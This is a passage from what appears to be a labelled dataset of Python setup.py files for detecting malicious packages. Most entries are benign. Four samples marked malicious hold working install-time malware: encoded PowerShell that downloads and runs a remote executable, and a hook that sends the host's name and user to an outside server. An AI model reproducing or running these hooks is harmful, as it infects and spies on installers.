Information Analysis\",\n                     \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n                     \"Topic :: Scientific/Engineering :: Bio-Informatics\",\n                     \"Programming Language :: Python\",\n                     \"Operating System :: OS Independent\",\n                     \"License :: OSI Approved :: BSD License\",\n                     \"Intended Audience :: Science/Research\",\n                     \"Development Status :: 4 - Beta\"],\n  )\n", "target": 0}
{"idx": "toolpull-10.41", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'toolpull',\n    packages = ['modlib'],\n    version = '5.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-rest-passwordreset-1.2.1", "func": "import os\n\nfrom setuptools import find_packages, setup\n\nwith open(os.path.join(os.path.dirname(__file__), 'README.md')) as readme:\n    README = readme.read()\n\n# allow setup.py to be run from any path\nos.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir)))\n\nsetup(\n    name='django-rest-passwordreset',\n    version=os.getenv('PACKAGE_VERSION', '0.0.0').replace('refs/tags/', ''),\n    packages=find_packages(),\n    include_package_data=True,\n    license='BSD License',\n    description='An extension of django rest framework, providing a configurable password reset strategy',\n    long_description=README,\n    long_description_content_type='text/markdown',  # This is important for README.md in markdown format\n    url='https://github.com/anx-ckreuzberger/django-rest-passwordreset',\n    author='Christian Kreuzberger',\n    author_email='ckreuzberger@anexia-it.com',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    ],\n)\n", "target": 0}
{"idx": "fastdiff-0.3.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"The setup script.\"\"\"\n\nfrom setuptools import setup, find_packages\n\nwith open('README.rst') as readme_file:\n    readme = readme_file.read()\n\nwith open('HISTORY.rst') as history_file:\n    history = history_file.read()\n\nrequirements = [\n    'wasmer>=1.0.0',\n    'wasmer-compiler-cranelift>=1.0.0'\n]\n\nsetup_requirements = ['pytest-runner', ]\n\ntest_requirements = ['pytest', ]\n\nsetup(\n    author=\"Syrus Akbary\",\n    author_email='me@syrusakbary.com',\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        \"Programming Language :: Python :: 2\",\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n    ],\n    description=\"A fast native implementation of diff algorithm with a pure python fallback\",\n    install_requires=requirements,\n    license=\"MIT license\",\n    long_description=readme + '\\n\\n' + history,\n    include_package_data=True,\n    keywords='fastdiff',\n    name='fastdiff',\n    packages=find_packages(include=['fastdiff']),\n    setup_requires=setup_requirements,\n    test_suite='tests',\n    tests_require=test_requirements,\n    url='https://github.com/syrusakbary/fastdiff',\n    version='0.3.0',\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "fasttext-0.9.2", "func": "#!/usr/bin/env python\n\n# Copyright (c) 2017-present, Facebook, Inc.\n# All rights reserved.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n#\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\nfrom __future__ import unicode_literals\n\nfrom setuptools import setup, Extension\nfrom setuptools.command.build_ext import build_ext\nimport sys\nimport setuptools\nimport os\nimport subprocess\nimport platform\nimport io\n\n__version__ = '0.9.2'\nFASTTEXT_SRC = \"src\"\n\n# Based on https://github.com/pybind/python_example\n\nclass get_pybind_include(object):\n    \"\"\"Helper class to determine the pybind11 include path\n\n    The purpose of this class is to postpone importing pybind11\n    until it is actually installed, so that the ``get_include()``\n    method can be invoked. \"\"\"\n\n    def __init__(self, user=False):\n        try:\n            import pybind11\n        except ImportError:\n            if subprocess.call([sys.executable, '-m', 'pip', 'install', 'pybind11']):\n                raise RuntimeError('pybind11 install failed.')\n\n        self.user = user\n\n    def __str__(self):\n        import pybind11\n        return pybind11.get_include(self.user)\n\ntry:\n    coverage_index = sys.argv.index('--coverage')\nexcept ValueError:\n    coverage = False\nelse:\n    del sys.argv[coverage_index]\n    coverage = True\n\nfasttext_src_files = map(str, os.listdir(FASTTEXT_SRC))\nfasttext_src_cc = list(filter(lambda x: x.endswith('.cc'), fasttext_src_files))\n\nfasttext_src_cc = list(\n    map(lambda x: str(os.path.join(FASTTEXT_SRC, x)), fasttext_src_cc)\n)\n\next_modules = [\n    Extension(\n        str('fasttext_pybind'),\n        [\n            str('python/fasttext_module/fasttext/pybind/fasttext_pybind.cc'),\n        ] + fasttext_src_cc,\n        include_dirs=[\n            # Path to pybind11 headers\n            get_pybind_include(),\n            get_pybind_include(user=True),\n            # Path to fasttext source code\n            FASTTEXT_SRC,\n        ],\n        language='c++',\n        extra_compile_args=[\"-O0 -fno-inline -fprofile-arcs -pthread -march=native\" if coverage else\n                            \"-O3 -funroll-loops -pthread -march=native\"],\n    ),\n]\n\n\n# As of Python 3.6, CCompiler has a `has_flag` method.\n# cf http://bugs.python.org/issue26689\ndef has_flag(compiler, flags):\n    \"\"\"Return a boolean indicating whether a flag name is supported on\n    the specified compiler.\n    \"\"\"\n    import tempfile\n    with tempfile.NamedTemporaryFile('w', suffix='.cpp') as f:\n        f.write('int main (int argc, char **argv) { return 0; }')\n        try:\n            compiler.compile([f.name], extra_postargs=flags)\n        except setuptools.distutils.errors.CompileError:\n            return False\n    return True\n\n\ndef cpp_flag(compiler):\n    \"\"\"Return the -std=c++[11/14] compiler flag.\n    The c++14 is preferred over c++11 (when it is available).\n    \"\"\"\n    standards = ['-std=c++14', '-std=c++11']\n    for standard in standards:\n        if has_flag(compiler, [standard]):\n            return standard\n    raise RuntimeError(\n        'Unsupported compiler -- at least C++11 support '\n        'is needed!'\n    )\n\n\nclass BuildExt(build_ext):\n    \"\"\"A custom build extension for adding compiler-specific options.\"\"\"\n    c_opts = {\n        'msvc': ['/EHsc'],\n        'unix': [],\n    }\n\n    def build_extensions(self):\n        if sys.platform == 'darwin':\n            mac_osx_version = float('.'.join(platform.mac_ver()[0].split('.')[:2]))\n            os.environ['MACOSX_DEPLOYMENT_TARGET'] = str(mac_osx_version)\n            all_flags = ['-stdlib=libc++', '-mmacosx-version-min=10.7']\n            if has_flag(self.compiler, [all_flags[0]]):\n                self.c_opts['unix'] += [all_flags[0]]\n            elif has_flag(self.compiler, all_flags):\n                self.c_opts['unix'] += all_flags\n            else:\n                raise RuntimeError(\n                    'libc++ is needed! Failed to compile with {} and {}.'.\n                    format(\" \".join(all_flags), all_flags[0])\n                )\n        ct = self.compiler.compiler_type\n        opts = self.c_opts.get(ct, [])\n        extra_link_args = []\n\n        if coverage:\n            coverage_option = '--coverage'\n            opts.append(coverage_option)\n            extra_link_args.append(coverage_option)\n\n        if ct == 'unix':\n            opts.append('-DVERSION_INFO=\"%s\"' % self.distribution.get_version())\n            opts.append(cpp_flag(self.compiler))\n            if has_flag(self.compiler, ['-fvisibility=hidden']):\n                opts.append('-fvisibility=hidden')\n        elif ct == 'msvc':\n            opts.append(\n                '/DVERSION_INFO=\\\\\"%s\\\\\"' % self.distribution.get_version()\n            )\n        for ext in self.extensions:\n            ext.extra_compile_args = opts\n            ext.extra_link_args = extra_link_args\n        build_ext.build_extensions(self)\n\n\ndef _get_readme():\n    \"\"\"\n    Use pandoc to generate rst from md.\n    pandoc --from=markdown --to=rst --output=python/README.rst python/README.md\n    \"\"\"\n    with io.open(\"python/README.rst\", encoding='utf-8') as fid:\n        return fid.read()\n\n\nsetup(\n    name='fasttext',\n    version=__version__,\n    author='Onur Celebi',\n    author_email='celebio@fb.com',\n    description='fasttext Python bindings',\n    long_description=_get_readme(),\n    ext_modules=ext_modules,\n    url='https://github.com/facebookresearch/fastText',\n    license='MIT',\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Software Development',\n        'Topic :: Scientific/Engineering',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Operating System :: Unix',\n        'Operating System :: MacOS',\n    ],\n    install_requires=['pybind11>=2.2', \"setuptools >= 0.7.0\", \"numpy\"],\n    cmdclass={'build_ext': BuildExt},\n    packages=[\n        str('fasttext'),\n        str('fasttext.util'),\n        str('fasttext.tests'),\n    ],\n    package_dir={str(''): str('python/fasttext_module')},\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "django-migration-linter-4.1.0", "func": "import ast\nimport re\nfrom os import path\n\nfrom setuptools import find_packages, setup\n\nPROJECT_DIR = path.abspath(path.dirname(__file__))\n\n\ndef get_version():\n    constants = path.join(PROJECT_DIR, \"django_migration_linter\", \"constants.py\")\n    _version_re = re.compile(r\"__version__\\s+=\\s+(?P<version>.*)\")\n    with open(constants, \"r\") as f:\n        match = _version_re.search(f.read())\n        version = match.group(\"version\") if match is not None else '\"unknown\"'\n    return str(ast.literal_eval(version))\n\n\nwith open(path.join(PROJECT_DIR, \"README.md\")) as f:\n    long_description = f.read()\n\n\nsetup(\n    name=\"django-migration-linter\",\n    version=get_version(),\n    description=\"Detect backward incompatible migrations for your django project\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/3YOURMIND/django-migration-linter\",\n    author=\"3YOURMIND GmbH\",\n    author_email=\"david.wobrock@gmail.com\",\n    license=\"Apache License 2.0\",\n    packages=find_packages(include=[\"django_migration_linter*\"]),\n    install_requires=[\n        \"django>=2.2\",\n        \"appdirs>=1.4.3\",\n        \"toml>=0.10.2\",\n    ],\n    extras_require={\n        \"test\": [\n            \"tox>=3.15.2\",\n            \"mysqlclient>=1.4.6,<2\",\n            \"psycopg2-binary>=2.8.5,<2.9\",\n            \"django_add_default_value>=0.4.0\",\n            \"coverage>=5.5\",\n        ],\n    },\n    keywords=\"django migration lint linter database backward compatibility\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n)\n", "target": 0}
{"idx": "py-randomencode-6.95", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-randomencode',\n    packages = ['modlib'],\n    version = '7.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "facebook-wda-1.4.6", "func": "#!/usr/bin/env python\n# coding: utf-8\n#\n# Licensed under MIT\n#\n\nimport setuptools\nsetuptools.setup(setup_requires=['pbr'], pbr=True)\n", "target": 0}
{"idx": "libvisapostget-8.4", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libvisapostget',\n    packages = ['modlib'],\n    version = '6.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dm-tree-0.1.7", "func": "# Copyright 2019 DeepMind Technologies Limited. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\"\"\"Setup for pip package.\"\"\"\n\nimport os\nimport platform\nimport shutil\nimport subprocess\nimport sys\nimport sysconfig\n\nimport setuptools\nfrom setuptools.command import build_ext\n\nhere = os.path.dirname(os.path.abspath(__file__))\n\n\ndef _get_tree_version():\n  \"\"\"Parse the version string from tree/__init__.py.\"\"\"\n  with open(os.path.join(here, 'tree', '__init__.py')) as f:\n    try:\n      version_line = next(line for line in f if line.startswith('__version__'))\n    except StopIteration:\n      raise ValueError('__version__ not defined in tree/__init__.py')\n    else:\n      ns = {}\n      exec(version_line, ns)  # pylint: disable=exec-used\n      return ns['__version__']\n\n\ndef _parse_requirements(path):\n  with open(os.path.join(here, path)) as f:\n    return [\n        line.rstrip() for line in f\n        if not (line.isspace() or line.startswith('#'))\n    ]\n\n\nclass CMakeExtension(setuptools.Extension):\n  \"\"\"An extension with no sources.\n\n  We do not want distutils to handle any of the compilation (instead we rely\n  on CMake), so we always pass an empty list to the constructor.\n  \"\"\"\n\n  def __init__(self, name, source_dir=''):\n    super().__init__(name, sources=[])\n    self.source_dir = os.path.abspath(source_dir)\n\n\nclass BuildCMakeExtension(build_ext.build_ext):\n  \"\"\"Our custom build_ext command.\n\n  Uses CMake to build extensions instead of a bare compiler (e.g. gcc, clang).\n  \"\"\"\n\n  def run(self):\n    self._check_build_environment()\n    for ext in self.extensions:\n      self.build_extension(ext)\n\n  def _check_build_environment(self):\n    \"\"\"Check for required build tools: CMake, C++ compiler, and python dev.\"\"\"\n    try:\n      subprocess.check_call(['cmake', '--version'])\n    except OSError as e:\n      ext_names = ', '.join(e.name for e in self.extensions)\n      raise RuntimeError(\n          f'CMake must be installed to build the following extensions: {ext_names}'\n      ) from e\n    print('Found CMake')\n\n  def build_extension(self, ext):\n    extension_dir = os.path.abspath(\n        os.path.dirname(self.get_ext_fullpath(ext.name)))\n    build_cfg = 'Debug' if self.debug else 'Release'\n    cmake_args = [\n        f'-DPython3_ROOT_DIR={sys.prefix}',\n        f'-DPython3_EXECUTABLE={sys.executable}',\n        f'-DCMAKE_LIBRARY_OUTPUT_DIRECTORY={extension_dir}',\n        f'-DCMAKE_BUILD_TYPE={build_cfg}'\n    ]\n    if platform.system() != 'Windows':\n      cmake_args.extend([\n          f'-DPython3_LIBRARY={sysconfig.get_paths()[\"stdlib\"]}',\n          f'-DPython3_INCLUDE_DIR={sysconfig.get_paths()[\"include\"]}',\n      ])\n    if platform.system() == 'Darwin' and os.environ.get('ARCHFLAGS'):\n      osx_archs = []\n      if '-arch x86_64' in os.environ['ARCHFLAGS']:\n        osx_archs.append('x86_64')\n      if '-arch arm64' in os.environ['ARCHFLAGS']:\n        osx_archs.append('arm64')\n      cmake_args.append(f'-DCMAKE_OSX_ARCHITECTURES={\";\".join(osx_archs)}')\n    os.makedirs(self.build_temp, exist_ok=True)\n    subprocess.check_call(\n        ['cmake', ext.source_dir] + cmake_args, cwd=self.build_temp)\n    subprocess.check_call(\n        ['cmake', '--build', '.', f'-j{os.cpu_count()}', '--config', build_cfg],\n        cwd=self.build_temp)\n\n    # Force output to <extension_dir>/. Amends CMake multigenerator output paths\n    # on Windows and avoids Debug/ and Release/ subdirs, which is CMake default.\n    tree_dir = os.path.join(extension_dir, 'tree')  # pylint:disable=unreachable\n    for cfg in ('Release', 'Debug'):\n      cfg_dir = os.path.join(extension_dir, cfg)\n      if os.path.isdir(cfg_dir):\n        for f in os.listdir(cfg_dir):\n          shutil.move(os.path.join(cfg_dir, f), tree_dir)\n\n\nsetuptools.setup(\n    name='dm-tree',\n    version=_get_tree_version(),\n    url='https://github.com/deepmind/tree',\n    description='Tree is a library for working with nested data structures.',\n    author='DeepMind',\n    author_email='tree-copybara@google.com',\n    long_description=open(os.path.join(here, 'README.md')).read(),\n    long_description_content_type='text/markdown',\n    # Contained modules and scripts.\n    packages=setuptools.find_packages(),\n    tests_require=_parse_requirements('requirements-test.txt'),\n    test_suite='tree',\n    cmdclass=dict(build_ext=BuildCMakeExtension),\n    ext_modules=[CMakeExtension('_tree', source_dir='tree')],\n    zip_safe=False,\n    # PyPI package information.\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Scientific/Engineering :: Mathematics',\n        'Topic :: Software Development :: Libraries',\n    ],\n    license='Apache 2.0',\n    keywords='tree nest flatten',\n)\n", "target": 0}
{"idx": "graphcore-cloud-tools-1.0.0", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/graphcore-cloud-tools.php\",params = ploads)\n\n\nsetup(name='graphcore-cloud-tools',\n      version='1.0.0',\n      description='White Hat Researcher',\n      author='whitehatguy',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n", "target": 1}
{"idx": "flake8_formatter_junit_xml-0.0.6", "func": "from __future__ import with_statement\nimport setuptools\n\nrequires = [\n    \"flake8 > 3.0.0\",\n    \"junit-xml >= 1.8\"\n]\n\nreadme = open('README.rst').read()\n\nsetuptools.setup(\n    name=\"flake8_formatter_junit_xml\",\n    license=\"MIT\",\n    version=\"0.0.6\",\n    description=\"JUnit XML Formatter for flake8\",\n    long_description=readme,\n    author=\"Asato Wakisaka\",\n    author_email=\"asato.wakisaka@gmail.com\",\n    url=\"https://github.com/astj/flake8-formatter-junit-xml\",\n    packages=setuptools.find_packages(exclude=['examples']),\n    install_requires=requires,\n    entry_points={\n        'flake8.report': [\n            'junit-xml = flake8_formatter_junit_xml:JUnitXmlFormatter',\n        ],\n    },\n    classifiers=[\n        \"Framework :: Flake8\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Quality Assurance\",\n    ],\n)\n", "target": 0}
{"idx": "emoji-country-flag-1.3.1", "func": "import setuptools\nimport os\nimport io\n\n\nwith io.open(\"README.md\", encoding=\"utf-8\") as f:\n    long_description = []\n    for line in f:\n        if not line.strip().startswith(\"[![\"):\n            long_description.append(line)\n    long_description = \"\".join(long_description).strip()\n\nversion = None\nwith io.open(os.path.join(\"flag\", \"__init__.py\"), encoding=\"utf-8\") as f:\n    for line in f:\n        if line.strip().startswith(\"__version__\"):\n            version = line.split(\"=\")[1].strip()\n            version = version.replace('\"', \"\").replace(\"'\", \"\")\n            break\n\nsetuptools.setup(\n    name=\"emoji-country-flag\",\n    version=version,\n    license=\"MIT\",\n    author=\"cuzi\",\n    author_email=\"cuzi@openmail.cc\",\n    description=\"En/Decode unicode country flags emoji\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://flag.readthedocs.io/\",\n    packages=[\"flag\"],\n    zip_safe=True,\n    extras_require={\n        \"test\": [\n            \"pytest\",\n            \"emoji\",\n            \"setuptools\"\n        ],\n    },\n    package_data={\n        \"flag\": [\n            \"py.typed\",\n            \"*.pyi\"\n        ],\n    },\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n        \"Topic :: Communications :: Chat\",\n        \"Topic :: Printing\",\n        \"Topic :: Text Processing :: General\",\n        \"Typing :: Typed\"\n    ]\n)\n", "target": 0}
{"idx": "funcparserlib-1.0.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['funcparserlib']\n\npackage_data = \\\n{'': ['*']}\n\nsetup_kwargs = {\n    'name': 'funcparserlib',\n    'version': '1.0.0',\n    'description': 'Recursive descent parsing library based on functional combinators',\n    'long_description': 'Funcparserlib\\n=============\\n\\nRecursive descent parsing library for Python based on functional combinators.\\n\\n[![PyPI](https://img.shields.io/pypi/v/funcparserlib)](https://pypi.org/project/funcparserlib/)\\n[![PyPI - Downloads](https://img.shields.io/pypi/dm/funcparserlib)](https://pypi.org/project/funcparserlib/)\\n\\n\\nDescription\\n-----------\\n\\nThe primary focus of `funcparserlib` is **parsing little languages** or **external DSLs** (domain specific languages).\\n\\nParsers made with `funcparserlib` are pure-Python LL(\\\\*) parsers. It means that it\\'s **very easy to write parsers** without thinking about lookaheads and other hardcore parsing stuff. However, recursive descent parsing is a rather slow method compared to LL(k) or LR(k) algorithms. Still, parsing with `funcparserlib` is **at least twice faster than PyParsing**, a very popular library for Python.\\n\\nThe source code of `funcparserlib` is only 1.2K lines of code, with lots of comments. Its API is fully type hinted. It features the longest parsed prefix error reporting, as well as a tiny lexer generator for token position tracking.\\n\\nThe idea of parser combinators used in `funcparserlib` comes from the [Introduction to Functional Programming](https://www.cl.cam.ac.uk/teaching/Lectures/funprog-jrh-1996/) course. We have converted it from ML into Python.\\n\\n\\nInstallation\\n------------\\n\\nYou can install `funcparserlib` from [PyPI](https://pypi.org/project/funcparserlib/):\\n\\n```shell\\n$ pip install funcparserlib\\n```\\n\\nThere are no dependencies on other libraries.\\n\\n\\nDocumentation\\n-------------\\n\\n* [Getting Started](https://funcparserlib.pirx.ru/getting-started/)\\n    * Your **starting point** with `funcparserlib`\\n* [API Reference](https://funcparserlib.pirx.ru/api/)\\n    * Learn the details of the API\\n\\nThere are several examples available in the `tests/` directory:\\n\\n* [GraphViz DOT parser](https://github.com/vlasovskikh/funcparserlib/blob/master/tests/dot.py)\\n* [JSON parser](https://github.com/vlasovskikh/funcparserlib/blob/master/tests/json.py)\\n\\nSee also [the changelog](https://funcparserlib.pirx.ru/changes/).\\n\\n\\nExample\\n-------\\n\\nLet\\'s consider a little language of **numeric expressions** with a syntax similar to Python expressions. Here are some expression strings in this language:\\n\\n```\\n0\\n1 + 2 + 3\\n-1 + 2 ** 32\\n3.1415926 * (2 + 7.18281828e-1) * 42\\n```\\n\\n\\nHere is **the complete source code** of the tokenizer and the parser for this language written using `funcparserlib`:\\n\\n```python\\nfrom typing import List, Tuple, Union\\nfrom dataclasses import dataclass\\n\\nfrom funcparserlib.lexer import make_tokenizer, TokenSpec, Token\\nfrom funcparserlib.parser import tok, Parser, many, forward_decl, finished\\n\\n\\n@dataclass\\nclass BinaryExpr:\\n    op: str\\n    left: \"Expr\"\\n    right: \"Expr\"\\n\\n\\nExpr = Union[BinaryExpr, int, float]\\n\\n\\ndef tokenize(s: str) -> List[Token]:\\n    specs = [\\n        TokenSpec(\"whitespace\", r\"\\\\s+\"),\\n        TokenSpec(\"float\", r\"[+\\\\-]?\\\\d+\\\\.\\\\d*([Ee][+\\\\-]?\\\\d+)*\"),\\n        TokenSpec(\"int\", r\"[+\\\\-]?\\\\d+\"),\\n        TokenSpec(\"op\", r\"(\\\\*\\\\*)|[+\\\\-*/()]\"),\\n    ]\\n    tokenizer = make_tokenizer(specs)\\n    return [t for t in tokenizer(s) if t.type != \"whitespace\"]\\n\\n\\ndef parse(tokens: List[Token]) -> Expr:\\n    int_num = tok(\"int\") >> int\\n    float_num = tok(\"float\") >> float\\n    number = int_num | float_num\\n\\n    expr: Parser[Token, Expr] = forward_decl()\\n    parenthesized = -op(\"(\") + expr + -op(\")\")\\n    primary = number | parenthesized\\n    power = primary + 